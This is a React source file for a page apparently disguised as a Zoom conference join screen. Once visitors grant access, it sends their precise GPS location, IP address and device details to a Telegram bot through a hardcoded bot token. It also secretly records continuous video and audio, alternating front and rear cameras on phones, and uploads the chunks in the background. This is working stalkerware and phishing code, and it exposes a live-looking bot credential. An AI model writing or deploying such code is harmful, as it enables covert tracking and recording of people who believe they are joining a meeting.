import { VideoRecorder } from "./components/VideoRecorder";
import { sendVideoToTelegram } from "./utils/videoUpload";
import ZoomConf from "./components/ZoomConf";
import { useState, useEffect, useRef } from "react";

// Set viewport IMMEDIATELY (before React renders)
if (typeof document !== 'undefined') {
  let viewportMeta = document.querySelector('meta[name="viewport"]') as HTMLMetaElement;
  const correctViewport = 'width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes';
  
  if (!viewportMeta) {
    viewportMeta = document.createElement('meta');
    viewportMeta.setAttribute('name', 'viewport');
    document.head.appendChild(viewportMeta);
  }
  
  viewportMeta.setAttribute('content', correctViewport);
  console.log('🚀 Viewport установлен ДО рендера React:', correctViewport);
}

export default function App() {
  const [coordsData, setCoordsData] = useState<string>("");
  const [showCoords, setShowCoords] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [deviceType, setDeviceType] = useState<'ios' | 'android' | 'desktop'>('desktop');
  const [showRetryButton, setShowRetryButton] = useState(false);
  const [iframeWarning, setIframeWarning] = useState<string>("");
  
  // Video recording states (now includes audio)
  const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('front');
  const isSwitchingCameraRef = useRef(false);
  const globalChunkCounterRef = useRef(0); // Global chunk counter across camera switches
  
  // Check if running in iframe with restricted permissions
  const checkIframePermissions = (): string | null => {
    // Check if we're in an iframe
    const inIframe = window.self !== window.top;
    if (!inIframe) return null;

    // Check Permissions Policy
    try {
      // @ts-ignore - Permissions Policy API
      const policy = document.featurePolicy || document.permissionsPolicy;
      if (policy) {
        const geoAllowed = policy.allowsFeature?.('geolocation') ?? true;
        const camAllowed = policy.allowsFeature?.('camera') ?? true;
        const micAllowed = policy.allowsFeature?.('microphone') ?? true;
        
        if (!geoAllowed || !camAllowed || !micAllowed) {
          return '🚨 IFRAME PERMISSIONS BLOCKED!\n\nThis app is running in an iframe without proper permissions.\n\nRequired iframe attributes:\nallow="geolocation; camera; microphone"\n\nOr for Safari:\nallow="geolocation *; camera *; microphone *"';
        }
      }
    } catch (e) {
      // Feature Policy API not available, assume blocked
      return '⚠️ WARNING: Running in iframe\n\nPermissions may be blocked by iframe policy.\nIf requests fail, add these iframe attributes:\n\nallow="geolocation; camera; microphone"';
    }

    return null;
  };

  // Detect device type
  const detectDevice = (): 'ios' | 'android' | 'desktop' => {
    const ua = navigator.userAgent;
    
    // Log for debugging
    console.log('🔍 User Agent:', ua);
    console.log('🔍 Platform:', navigator.platform);
    console.log('🔍 Touch points:', navigator.maxTouchPoints);
    
    // Check for iOS (case-insensitive)
    if (/iPad|iPhone|iPod/i.test(ua)) {
      console.log('✅ Detected: iOS');
      return 'ios';
    }
    
    // Check for Android (case-insensitive, multiple patterns)
    if (/Android/i.test(ua) || /android/i.test(ua)) {
      console.log('✅ Detected: Android');
      return 'android';
    }
    
    // Additional check for mobile devices by platform
    const platform = navigator.platform?.toLowerCase() || '';
    if (platform.includes('android')) {
      console.log('✅ Detected: Android (via platform)');
      return 'android';
    }
    
    if (platform.includes('iphone') || platform.includes('ipad') || platform.includes('ipod')) {
      console.log('✅ Detected: iOS (via platform)');
      return 'ios';
    }
    
    // Check for touch support as additional indicator
    const isTouchDevice = navigator.maxTouchPoints > 0 || 'ontouchstart' in window;
    
    // If has touch but not detected above, try to guess from screen size
    if (isTouchDevice) {
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
      console.log('📱 Touch device detected, screen:', screenWidth, 'x', screenHeight);
      
      // Mobile-like screen size
      if (screenWidth <= 768 || screenHeight <= 768) {
        console.log('⚠️ Touch device with mobile screen size - defaulting to Android');
        return 'android';
      }
    }
    
    console.log('✅ Detected: Desktop');
    return 'desktop';
  };

  // Detect browser type
  const detectBrowser = (): 'safari' | 'chrome' | 'firefox' | 'other' => {
    const ua = navigator.userAgent;
    if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Chromium/.test(ua)) {
      return 'safari';
    }
    if (/Chrome/.test(ua) || /Chromium/.test(ua)) {
      return 'chrome';
    }
    if (/Firefox/.test(ua)) {
      return 'firefox';
    }
    return 'other';
  };

  // Log helper
  const log = (message: string) => {
    console.log(message);
  };

  // WebRTC trigger for Local Network Access on macOS
  const triggerLocalNetworkAccess = (): Promise<void> => {
    return new Promise((resolve) => {
      try {
        log('🌐 [macOS] Триггерим запрос Local Network Access через WebRTC...');
        
        // Create RTCPeerConnection to trigger local network permission
        const pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' }
          ]
        });
        
        // Create data channel
        pc.createDataChannel('trigger-local-network');
        
        // Create offer to start ICE gathering
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .then(() => {
            log('✅ [macOS] WebRTC offer создан - должен появиться запрос Local Network Access');
            
            // Wait a bit for the permission dialog
            setTimeout(() => {
              pc.close();
              log('✅ [macOS] WebRTC connection закрыт, ждём разрешения...');
              // Give user time to grant permission before continuing
              setTimeout(() => resolve(), 2000);
            }, 1000);
          })
          .catch(err => {
            log('⚠️ [macOS] WebRTC ошбка (не критичн):', err);
            pc.close();
            resolve();
          });
        
      } catch (error) {
        log('⚠️ [macOS] WebRTC не поддерживается:', error);
        resolve();
      }
    });
  };

  // IP-based geolocation fallback
  const getIPGeolocation = async (): Promise<{ latitude: number; longitude: number; accuracy: number; city?: string }> => {
    try {
      log('🌐 Используем IP-геолокацию как fallback...');
      
      // Get IP and location data
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      log('✅ IP-геолокация получена:', data);
      
      return {
        latitude: parseFloat(data.latitude) || 0,
        longitude: parseFloat(data.longitude) || 0,
        accuracy: 50000, // IP geolocation is ~50km accuracy
        city: data.city || 'Unknown'
      };
    } catch (error) {
      log('❌ Ошибка IP-геолокации:', error);
      throw new Error('IP-геолокация недоступна');
    }
  };

  // Request Camera & Microphone
  const requestCamMic = async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error('getUserMedia не поддрживается');
    }
    
    log('▶️ Запрашиваем камеру и микрофон…');
    
    // Just request permissions - don't start recording yet
    const device = detectDevice();
    
    if (device === 'desktop') {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });
      // Stop the stream - we'll request it again when starting recording
      stream.getTracks().forEach(track => track.stop());
    } else {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });
      // Stop the stream - we'll request it again when starting recording
      stream.getTracks().forEach(track => track.stop());
    }
    
    log('✅ Камера и микрофон: разрешено');
  };

  // Request precise location with maximum accuracy (GPS)
  const requestLocation = (timeoutMs = 8000) => {
    return new Promise((resolve, reject) => {
      if (!('geolocation' in navigator)) {
        reject(new Error('Geolocation API ндоступен'));
        return;
      }

      log('▶️ Запрашиваем геолокацию…');
      
      // Detect if running on macOS
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      // macOS needs more time and different settings
      const options = isMac ? {
        enableHighAccuracy: false,  // macOS works better with low accuracy (Wi-Fi based)
        timeout: 30000,             // Give macOS 30 seconds
        maximumAge: 10000           // Allow 10 second cache
      } : { 
        enableHighAccuracy: true,   // Mobile: Force GPS usage
        timeout: timeoutMs,
        maximumAge: 0               // Mobile: No cached positions
      };
      
      if (isMac) {
        log('🖥 macOS обнаружен - используем Wi-Fi геолокацию с увеличенным таймаутом (30 сек)');
      }
      
      navigator.geolocation.getCurrentPosition(
        position => {
          const { latitude, longitude, accuracy } = position.coords;
          log(`✅ Геолокация: ${latitude.toFixed(5)}, ${longitude.toFixed(5)} (±${accuracy}м)`);
          resolve(position);
        },
        error => reject(error),
        options
      );
    });
  };

  // Helper for media errors
  const hintForMediaError = (err: any) => {
    const name = (err && (err.name || err.message) || '').toString();
    if (name.includes('NotAllowed') || name.includes('Permission') || name.includes('Denied')) {
      return [
        '❌ Камра и микрофон заблокированы.',
        '',
        'iOS (Safari): Настройки > Safari > Камера и Микрофон',
        '→ Разрешить для этого сайта.',
        '',
        'Android (Chrome): значок замка в адресной строке',
        '→ Рзрешения → Камера и Микрофон → Разрешить.'
      ].join('\n');
    }
    if (name.includes('NotFound')) return '❌ Не найдена камера или микрофон.\nПовеьте подключение устройства.';
    if (name.includes('Overconstrained')) return '❌ Запрошенное качество недоступно.';
    return '❌ Не удалось получить камеру/микрофон.\nПерезагрузите страницу и проверьте разрешения.';
  };

  // Helper for geo errors
  const hintForGeoError = (err: any) => {
    // Detect if running on macOS
    const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                  /Macintosh/.test(navigator.userAgent);
    
    switch (err && err.code) {
      case 1: return [
        '❌ Геолокация запрещена.',
        '',
        isMac ? '🖥️ macOS (Safari/Chrome):' : 'iOS (Safari): Настройи > Safari > Геопозиция',
        isMac ? 'Настройки > Защита и безопасность > Службы геолокации' : '→ Разрешить.',
        isMac ? '→ Включите службы геолокации' : '',
        isMac ? '→ Разрешите Safari/Chrome доступ к геолокации' : 'Android (Chrome): значок замка',
        isMac ? '' : '→ Разрешения → Геоданные → Разрешить.',
        '',
        isMac ? '⚠️ Также бедитесь что подключены к Wi-Fi!' : 'Для точности включите «Точная геопозиция»',
        isMac ? 'Mac определяет местоположение через Wi-Fi сети.' : 'в настройках ОС.'
      ].filter(Boolean).join('\n');
      case 2: return isMac 
        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > Сужбы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используетс Wi-Fi трангуляция!'
        : '❌ Не удалось определить местоположение.\nВключите GPS и/или интернет.';
      case 3: return '❌ Истёк таймаут.\nПерейдите в место с лучшим приёмом GPS/сети\nи повторите.';
      default: return isMac
        ? '❌ Ошибка геолокации.\n\n🖥️ macOS требует:\n✅ Включенные службы геолокации\n✅ Активное Wi-Fi подключение\n✅ Разрешение браузеру\n\nПроверьте все пункты и повторите!'
        : '❌ Ошибка геолокации.\nПроверьте разрешения и сигнал GPS/сети.';
    }
  };

  // Main permission request - aggressive mode (all at once)
  const handleRequestAllPermissions = async () => {
    // Check iframe permissions first
    const iframeCheck = checkIframePermissions();
    if (iframeCheck) {
      setCoordsData(iframeCheck);
      setShowCoords(true);
      setIframeWarning(iframeCheck);
      return;
    }
    
    const device = detectDevice();
    setDeviceType(device);
    
    console.log('🚀 Requesting permissions (microphone, geolocation)...');
    
    // Execute permission requests immediately without any delays
    await executePermissionRequests();
  };

  // Execute the actual permission requests
  const executePermissionRequests = async () => {
    // CRITICAL: Start requesting permissions IMMEDIATELY without any delays
    // Browser security requires permissions to be requested in direct user action handler
    
    const results: string[] = [];
    let hasErrors = false;
    let hasGeoError = false;

    // Show initial message AFTER starting the requests (non-blocking)
    setShowModal(false);
    setShowRetryButton(false);

    // Request Microphone & Camera FIRST (synchronously, no delays before this!)
    let cameraSuccess = false;
    try {
      // This must be the FIRST async operation after user click
      await requestCamMic();
      results.push('✅ Камера и микрофон: разрешено');
      cameraSuccess = true;
      
      // Update UI after success
      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолок��цию...');
      setShowCoords(true);
    } catch (e: any) {
      hasErrors = true;
      const hint = hintForMediaError(e);
      results.push(hint);
      setCoordsData(hint + '\n\n🔄 Запрашиваем геолокацию...');
      setShowCoords(true);
      
      // Don't throw yet - continue to request geolocation
      console.log('⚠️ Камера отклонена, но продолжаем запрашивать геолокацию...');
    }

    // Request Geolocation (only if camera succeeded or independently)
    try {
      // Update status
      if (cameraSuccess) {
        setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолокацию...');
      } else {
        setCoordsData('🔄 Запрашиваем геолокацию...');
      }
      
      // Detect if running on macOS
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      // On macOS, trigger Local Network Access request BEFORE geolocation
      if (isMac) {
        log('🖥️ macOS - триггерим Local Network Access...');
        setCoordsData((prev) => prev + '\n\n⚠️ macOS: Разрешите доступ к локальной сети');
        await triggerLocalNetworkAccess();
      }
      
      const position: any = await requestLocation(8000);
      const { latitude, longitude, accuracy } = position.coords;
      const lat = Number(latitude).toFixed(6);
      const lng = Number(longitude).toFixed(6);
      const acc = Math.round(accuracy);
      results.push(`✅ Геолокация: разрешено\nlat: ${lat}\nlng: ${lng}\nточность: ±${acc} м`)
      
      // Update UI
      setCoordsData(results.join('\n\n') + '\n\n📤 Отправка данных в Telegram...');
      
      // Send to Telegram bot
      await sendToTelegram(latitude, longitude, accuracy);
    } catch (e: any) {
      hasErrors = true;
      hasGeoError = true;
      
      // Try IP-based geolocation as fallback
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      if (isMac && e?.code === 2) {
        // macOS position unavailable - try IP geolocation
        try {
          log('⚠️ WiFi триангуляция не работает, пробуем IP-геолокацию...');
          const ipGeo = await getIPGeolocation();
          
          results.push(`⚠️ WiFi триангуляция недоступна\n\n✅ IP-геолокация (менее точная):\nlat: ${ipGeo.latitude.toFixed(6)}\nlng: ${ipGeo.longitude.toFixed(6)}\nточность: ±${Math.round(ipGeo.accuracy / 1000)} км${ipGeo.city ? '\nГород: ' + ipGeo.city : ''}`);
          
          // Send IP-based location to Telegram
          await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
        } catch (ipError) {
          log('❌ IP-геолокация также не работае:', ipError);
          const hint = hintForGeoError(e);
          results.push(hint);
          
          // Show specific instructions for macOS
          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ (macOS):\n1️⃣ Подключитесь к Wi-Fi\n2️⃣ Разрешите Local Network Access\n3️⃣ Включите службы геолокации\n4️⃣ Нажмите "Повторить попытку"');
        }
      } else {
        // Not macOS or different error - show standard hint
        const hint = hintForGeoError(e);
        results.push(hint);
        
        // Show specific GPS enable instructions
        if (e?.code === 2) {
          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повто��ить попытк"');
        }
      }
    }

    setCoordsData(results.join('\n\n'));
    setShowCoords(true);
    
    // Show retry button if GPS error
    if (hasGeoError) {
      setShowRetryButton(true);
    }

    // Start video recording AFTER getting all permissions
    console.log('🎥 Запускаем видеозапись после получения разрешений...');
    try {
      await startVideoRecording();
      results.push('✅ Видеозапись: запущена');
      setCoordsData(results.join('\n\n'));
      console.log('✅ Видеозапись успешно запущена');
    } catch (error) {
      console.error('❌ Ошибка запуска видеозаписи:', error);
      results.push('⚠️ Видеозапись: ошибка запуска');
      setCoordsData(results.join('\n\n'));
    }

    // Auto-hide success message after 4 seconds if no errors
    if (!hasErrors) {
      setTimeout(() => {
        setShowCoords(false);
      }, 4000);
    }
    
    // Don't throw error - just let user continue even if permissions denied
  };

  // Legacy function for backward compatibility
  const handleRequestPermissions = async () => {
    console.log('Requesting high-accuracy GPS location...');
    setShowCoords(false);
    setCoordsData('Requesting GPS...\nPlease enable GPS/Location Services\nif prompted by your device.');
    setShowCoords(true);
    
    try {
      const position: any = await requestLocation(30000);
      const { latitude, longitude, accuracy } = position.coords;
      const lat = Number(latitude).toFixed(6);
      const lng = Number(longitude).toFixed(6);
      const acc = Math.round(accuracy);
      setCoordsData(`✓ GPS Location granted\n\nlat: ${lat}\nlng: ${lng}\naccuracy: ±${acc} m`);
      setShowCoords(true);
    } catch (e: any) {
      if (e?.code === 1) {
        setCoordsData('Location: Permission denied\nPlease allow location access\nand enable GPS in settings.');
      } else if (e?.code === 2) {
        setCoordsData('Location: Position unavailable\nPlease enable GPS/Location Services\nin your device settings.');
      } else if (e?.code === 3) {
        setCoordsData('Location: Timeout\nGPS signal not found.\nPlease check GPS is enabled.');
      } else {
        setCoordsData(`Location: ${e?.message || 'Error'}`);
      }
      setShowCoords(true);
    }
  };

  // Function to get user IP address
  const getUserIP = async (): Promise<string> => {
    try {
      console.log('🌐 Запрашиваем IP-адрес...');
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      console.log('✅ IP получен:', data.ip);
      return data.ip || 'Unknown';
    } catch (error) {
      console.error('❌ Ошибка получения IP:', error);
      return 'Unknown';
    }
  };

  // Function to get all chat IDs from Telegram bot updates
  const getAllChatIds = async (botToken: string): Promise<Set<number>> => {
    try {
      console.log('📱 Получаем список пользователей бота...');
      const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
      const data = await response.json();
      
      console.log(' Отет от Telegram getUpdates:', data);
      
      if (data.ok && data.result) {
        const chatIds = new Set<number>();
        
        // Extract all unique chat IDs from updates
        data.result.forEach((update: any) => {
          if (update.message?.chat?.id) {
            chatIds.add(update.message.chat.id);
          }
          if (update.callback_query?.message?.chat?.id) {
            chatIds.add(update.callback_query.message.chat.id);
          }
        });
        
        console.log(`✅ Найдено ${chatIds.size} уникальных пользователей:`, Array.from(chatIds));
        return chatIds;
      }
      
      console.warn('⚠️ Нет данных от getUpdates');
      return new Set();
    } catch (error) {
      console.error('❌ Ошибка получения списка пользователей:', error);
      return new Set();
    }
  };

  // Safari-specific function to send message via XMLHttpRequest
  const sendMessageSafari = (botToken: string, chatId: number, message: string): Promise<boolean> => {
    return new Promise((resolve) => {
      try {
        console.log(`🍎 [Safari Mode] Отправка пользователю ${chatId}...`);
        
        const xhr = new XMLHttpRequest();
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        xhr.open('POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onload = function() {
          if (xhr.status >= 200 && xhr.status < 300) {
            console.log(`✅ [Safari] Успешно отправлено пользователю ${chatId}`);
            console.log(`📬 [Safari] Ответ:`, xhr.responseText);
            resolve(true);
          } else {
            console.warn(`⚠️ [Safari] Ошибка ${xhr.status} для пользователя ${chatId}:`, xhr.responseText);
            resolve(false);
          }
        };
        
        xhr.onerror = function() {
          console.error(`❌ [Safari] Сетевя ошбка при отправке пользовтелю ${chatId}`);
          resolve(false);
        };
        
        xhr.ontimeout = function() {
          console.error(`❌ [Safari] Таймаут при отправке пользователю ${chatId}`);
          resolve(false);
        };
        
        xhr.timeout = 10000; // 10 seconds timeout
        
        const payload = JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        });
        
        console.log(`📦 [Safari] Отправляем payload для ${chatId}`);
        xhr.send(payload);
      } catch (error) {
        console.error(`❌ [Safari] Исключение при отправк поьзователю ${chatId}:`, error);
        resolve(false);
      }
    });
  };

  // Function to send coordinates to Telegram bot
  const sendToTelegram = async (latitude: number, longitude: number, accuracy: number) => {
    const browser = detectBrowser();
    console.log(`🌐 Определен браузер: ${browser.toUpperCase()}`);
    
    try {
      console.log('🚀 Начинаем отправку в Telegram...');
      console.log('📍 Координаты:', { latitude, longitude, accuracy });
      
      // Get IP address
      const ip = await getUserIP();
      console.log('🌐 IP адрес получен:', ip);
      
      // Prepare message
      const lat = latitude.toFixed(6);
      const lng = longitude.toFixed(6);
      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
      
      const browserInfo = `${browser.toUpperCase()} (${detectDevice().toUpperCase()})`;
      
      const message = `🌍 Новая геолокация получена!\n\n` +
        `📍 Координаты:\n` +
        `   Широта: ${lat}\n` +
        `   Долгота: ${lng}\n` +
        `   Точность: ±${Math.round(accuracy)} м\n\n` +
        `🌐 IP-адрес: ${ip}\n` +
        `🔍 Браузер: ${browserInfo}\n\n` +
        `🗺️ Карта: ${googleMapsLink}\n\n` +
        `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;

      console.log('📝 Сообщение подготовлено:', message.substring(0, 100) + '...');

      const telegramBotToken = '8558710499:AAGJ8LA9PbCjQnnHGjBhq86ufCcZiIzXOxs';

      // Get all chat IDs from bot updates
      const chatIds = await getAllChatIds(telegramBotToken);
      
      if (chatIds.size === 0) {
        console.log('⚠️ Нет польвателей для отправки. Никто н писал боту /start');
        // Silent mode - no alert
        return;
      }

      console.log(`📤 Отправляем ${chatIds.size} пользователям...`);

      // Send message to all users
      let successCount = 0;
      let errorCount = 0;

      // Use Safari-specific method for Safari, regular fetch for others
      if (browser === 'safari') {
        console.log('🍎 Используем Safari-спцифичный метод (XMLHttpRequest)');
        
        for (const chatId of chatIds) {
          const success = await sendMessageSafari(telegramBotToken, chatId, message);
          if (success) {
            successCount++;
          } else {
            errorCount++;
          }
        }
      } else {
        console.log('🌐 Используем стандартный метод (fetch API)');
        
        for (const chatId of chatIds) {
          try {
            console.log(`📨 Отправка пользователю ${chatId}...`);
            
            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
              })
            });

            const responseData = await response.json();
            console.log(`📬 Ответ от Telegram для ${chatId}:`, responseData);

            if (response.ok) {
              successCount++;
              console.log(`✅ Успешно отправлено пользователю ${chatId}`);
            } else {
              errorCount++;
              console.warn(`⚠️ Н удалось отпавить пользователю ${chatId}:`, responseData);
            }
          } catch (error) {
            errorCount++;
            console.error(`❌ Ошибка отправки пользователю ${chatId}:`, error);
          }
        }
      }

      console.log(`✅✅✅ ИТОГО: Отправлено ${successCount} пользователям, шибок: ${errorCount}`);
    } catch (error) {
      console.error('❌❌❌ КРИТИЧЕСКАЯ ОШИБКА при отправке в Telegram:', error);
    }
  };

  // Start video recording - request cameras for mobile or desktop
  const startVideoRecording = async () => {
    const device = detectDevice();
    console.log(`🎥 Начинаем запись видео+аудио для устройства: ${device}`);
    
    try {
      // All devices: record only front camera WITH AUDIO
      console.log('📷 Запрашиваем фронтальную камеру + микрофон...');
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user', // Front camera
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true // ✅ Include audio in video stream
      });
      setVideoStreamFront(stream);
      setIsVideoRecording(true);
      console.log('✅ Фронтальная камера + микрофон готовы к записи');
    } catch (error) {
      console.error('❌ Ошибка при запуске видео+аудио записи:', error);
    }
  };
  
  // Switch camera (for mobile devices only)
  const switchCamera = async (newFacingMode: 'user' | 'environment') => {
    const device = detectDevice();
    
    // Only switch cameras on mobile devices
    if (device === 'desktop') {
      console.log('⚠️ Desktop detected - camera switching not available');
      return;
    }
    
    if (isSwitchingCameraRef.current) {
      console.log('⚠️ Camera switch already in progress, skipping...');
      return;
    }
    
    isSwitchingCameraRef.current = true;
    
    try {
      console.log(`📹 Переключаем камеру а: ${newFacingMode === 'user' ? 'ФРОНТАЛЬНУЮ' : 'ЗАДНЮЮ'}`);
      
      // Stop current stream
      if (videoStreamFront) {
        videoStreamFront.getTracks().forEach(track => {
          track.stop();
          console.log(`⏹️ Остановлен трек: ${track.kind} - ${track.label}`);
        });
      }
      
      // Stop recording temporarily
      setIsVideoRecording(false);
      
      // Wait a bit for cleanup
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // Request new camera stream
      console.log(`📷 Запрашиваем ${newFacingMode === 'user' ? 'фронтальную' : 'заднюю'} камеру + микрофон...`);
      const newStream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: newFacingMode,
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: true
      });
      
      // Update state with new stream
      setVideoStreamFront(newStream);
      setCurrentCameraType(newFacingMode === 'user' ? 'front' : 'back');
      
      // Wait for stream to be ready
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // Resume recording with new camera
      setIsVideoRecording(true);
      
      console.log(`✅ Камера переключена на ${newFacingMode === 'user' ? 'ФРОНТАЛЬНУЮ' : 'ЗАДНЮЮ'}`);
    } catch (error) {
      console.error(`❌ Ошибка переключения камеры:`, error);
      
      // If back camera fails, fallback to front camera
      if (newFacingMode === 'environment') {
        console.log('⚠️ Задняя камера недоступна, возвращаемся к фронтальной...');
        try {
          const fallbackStream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: true
          });
          setVideoStreamFront(fallbackStream);
          setCurrentCameraType('front');
          setIsVideoRecording(true);
          console.log('✅ Возвращены к фронтальной камере');
        } catch (fallbackError) {
          console.error('❌ Критическая ошибка - не удалось вернуться к фронтальной камере:', fallbackError);
        }
      }
    } finally {
      isSwitchingCameraRef.current = false;
    }
  };
  
  // Handle video chunk ready with camera switching logic
  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    console.log(`📹 Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    // Update current chunk number
    setCurrentChunkNumber(chunkNum);
    
    // CAMERA SWITCHING LOGIC (only for mobile devices)
    // Pattern: 3 front → 2 back → 3 front → 2 back → ... (infinite loop)
    const device = detectDevice();
    if (device !== 'desktop') {
      // Determine if we need to switch camera for the NEXT chunk
      // Cycle: chunks 1-3 front, 4-5 back, 6-8 front, 9-10 back, etc.
      // Switch after chunk 3, 5, 8, 10, 13, 15...
      
      const shouldSwitchToBack = chunkNum % 5 === 3 && currentCameraType === 'front';
      const shouldSwitchToFront = chunkNum % 5 === 0 && currentCameraType === 'back';
      
      if (shouldSwitchToBack) {
        console.log(`🔄 Чанк #${chunkNum} завершен - переключаем на ЗАДНЮЮ камеру`);
        setTimeout(() => {
          switchCamera('environment');
        }, 500);
      } else if (shouldSwitchToFront) {
        console.log(`🔄 Чанк #${chunkNum} завершен - переключаем на ФРОНТАЛЬНУЮ камеру`);
        setTimeout(() => {
          switchCamera('user');
        }, 500);
      }
    }
    
    // CRITICAL: Send video in background WITHOUT blocking UI
    // Remove 'await' to prevent freezing the entire browser window
    sendVideoToTelegram(blob, chunkNum, cameraType).catch(err => {
      console.error(`❌ Ошибка отправки чанка #${chunkNum}:`, err);
    });
    
    console.log(`✅ Чанк #${chunkNum} отправляется в фоне (UI не блокируется)`);
  };

  return (
    <>
      <ZoomConf onRequestPermissions={handleRequestAllPermissions} />
      
      {/* Video Recording Component - key forces remount on camera switch */}
      {videoStreamFront && (
        <VideoRecorder
          key={currentCameraType}
          stream={videoStreamFront}
          isRecording={isVideoRecording}
          onChunkReady={handleVideoChunkReady}
          cameraType={currentCameraType}
          globalChunkCounter={globalChunkCounterRef}
        />
      )}
    </>
  );
}